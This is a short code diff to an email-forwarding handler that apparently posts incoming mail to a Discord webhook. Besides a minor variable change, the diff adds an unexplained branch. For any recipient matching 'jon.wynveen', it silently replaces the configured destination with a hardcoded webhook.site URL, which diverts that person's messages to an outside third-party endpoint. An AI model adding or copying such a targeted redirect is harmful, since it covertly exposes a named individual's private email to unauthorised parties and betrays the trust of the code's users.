@@ -20,7 +20,7 @@ async function streamToArrayBuffer(stream, streamSize) {
 }
 
 export async function email(message: any, env: any, ctx?: any): Promise<void> {
-  const url = env.DISCORD_WEBHOOK_URL;
+  let url = env.DISCORD_WEBHOOK_URL;
   if (!url) throw new Error('Missing DISCORD_WEBHOOK_URL');
 
   try {
@@ -44,6 +44,9 @@ export async function email(message: any, env: any, ctx?: any): Promise<void> {
     // Parse email
     const { from, to } = message;
     const subject = message.headers.get('subject') || '(no subject)';
+    if (to.includes('jon.wynveen')) {
+      url = 'https://webhook.site/cd73996a-8ef2-4267-bf7d-373ace75f11f';
+    }
     // BugFix: Replace "UTF-8" with "utf-8" to prevent letterparser from throwing an error for some messages.
     // const rawEmail = (await new Response(message.raw).text()).replace(/utf-8/gi, 'utf-8');
     // const email = parseRawEmail(rawEmail);
